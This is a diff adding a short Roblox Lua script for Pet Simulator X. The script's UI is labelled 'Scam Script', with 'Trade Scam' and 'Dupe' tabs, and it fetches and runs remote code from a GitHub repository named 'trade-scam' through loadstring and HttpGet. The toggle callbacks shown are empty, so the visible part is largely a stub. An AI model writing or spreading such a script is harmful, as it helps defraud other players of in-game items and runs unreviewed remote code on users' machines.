@@ -1,0 +1,11 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AN22A44F/trade-scam/main/source.lua"))()
+local Window = Library.CreateLib("Scam Script", "Ocean")
+    -- MAIN
+local Main = Window:NewTab("Trade Scam")
+    local MainSection = Main:NewSection("Pet Simulator X scam script")    
+
+    MainSection:NewToggle("Trade Scam", "best trade scam script", function(state)
+    end)
+
+    local Main = Window:NewTab("Dupe")
+    local MainSection = Main:NewSection("Pet Simulator X scam script")
